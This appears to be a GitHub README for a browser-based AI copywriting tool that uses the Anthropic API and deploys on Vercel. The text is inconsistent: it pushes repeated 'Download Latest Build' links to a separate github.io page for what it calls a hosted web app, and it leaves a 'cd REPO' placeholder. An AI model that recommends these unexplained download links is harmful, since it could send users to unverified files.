# Consuma Writing Tool - AI Writing Tool 2026

> **Consuma Writing Tool is a browser-based AI copywriting utility that helps create consistent, brand-aligned content for social media, websites, and job descriptions by following a central writing rulebook.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bakernathankua7938/consuma-ai-writing-tool?style=flat-square)](https://github.com/bakernathankua7938/consuma-ai-writing-tool)

---

<p align="center">
  <a href="https://bakernathankua7938.github.io/consuma-ai-writing-tool/">
    <img src="https://img.shields.io/badge/Download-Consuma%20Writing%20Tool%20Latest-brightgreen?style=for-the-badge" alt="Download Consuma Writing Tool">
  </a>
</p>

> **[Download Consuma Writing Tool](https://bakernathankua7938.github.io/consuma-ai-writing-tool/)**

---

[Download Latest Build](https://bakernathankua7938.github.io/consuma-ai-writing-tool/)

---

## Overview

Consuma Writing Tool turns an established brand voice into a repeatable content-production process. Teams can use it to draft social posts, website content, and job descriptions while applying the same shared writing rules throughout.

The web interface communicates with the Anthropic API through a protected server-side request path. You can use the hosted version or deploy the application yourself on Vercel, depending on how you want to provide access to the writing workflow.

---

## What It Provides

- Produce Consuma-focused copy for different publishing destinations.
- Keep generated text aligned with a common writing rulebook.
- Draft social media updates, website material, and job descriptions.
- Work from a standalone prompt in ChatGPT or Claude.
- Route Anthropic API calls through the application.
- Run a separate instance of the tool on Vercel.
- Protect the API endpoint with an access code.
- Bring brand-focused writing tasks together in a single web application.

---

## Getting Started

First, create a local checkout of the repository:

```bash
git clone https://github.com/bakernathankua7938/consuma-ai-writing-tool.git
cd REPO
```

Before starting local development, supply the API and access configuration required by the project.

To create a personal deployment, import the repository into Vercel, define the required environment values, and deploy it. After the build is complete, visit the provided web address and enter the access code configured for that deployment.

---

## Using the Tool

1. Visit the hosted instance or your own Vercel deployment.
2. Enter the deployment's configured access code.
3. Choose the content format you want to produce.
4. Describe the topic, audience, context, or source material for the draft.
5. Run the Anthropic-powered generation flow.
6. Check the output against the shared writing rulebook.
7. Edit the approved copy as needed and publish it through the appropriate channel.

You can also use the project outside the web application. Copy its standalone prompt into ChatGPT or Claude, then add the applicable brand instructions and content brief.

---

## Deployment Configuration

The application receives its configuration from deployment settings and environment variables instead of fixed values in the source. Add the Anthropic API information and access code to the Vercel project before publishing.

A representative configuration looks like this:

```text
ANTHROPIC_API_KEY=your_anthropic_api_key
ACCESS_CODE=your_access_code
```

If the application expects different variable names, use those names instead of the illustrative values above. API keys and access codes should remain private and be entered through the hosting provider's environment or secret-management settings.

---

## Prerequisites

- A current web browser.
- An available Anthropic API configuration.
- An access code set up for protected API calls.
- A Vercel account when deploying a self-hosted instance.
- Internet connectivity for the application and its API operations.
- Permission to access the repository when working from a local copy.

---

## Common Questions

### Who can use Consuma Writing Tool?

The tool is intended for individuals and teams that need a consistent voice across social media, websites, and job descriptions.

### What formats can it generate?

Its intended use cases include social media copy, website content, and job descriptions. The shared writing rulebook helps maintain a consistent style across each format.

### Can the prompt be used with ChatGPT or Claude?

Yes. A standalone prompt is included for workflows that use ChatGPT or Claude directly rather than the web interface.

### How can I change the writing style?

Modify the shared writing rulebook or the applicable deployment configuration. If the change is part of the application source, redeploy the instance afterward.

### Where does the Anthropic API key belong?

Add the key as a protected environment value in Vercel, or in the equivalent environment system used by your deployment. Do not expose it in client-side files that can be accessed publicly.

### What can I verify when a request does not work?

Check that the Anthropic API settings are available, the entered access code matches the deployed value, and the application was rebuilt after configuration updates. The hosting provider's deployment logs may provide further information.

### Is an independent deployment supported?

Yes. You can deploy and configure a separate Consuma Writing Tool instance through Vercel.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
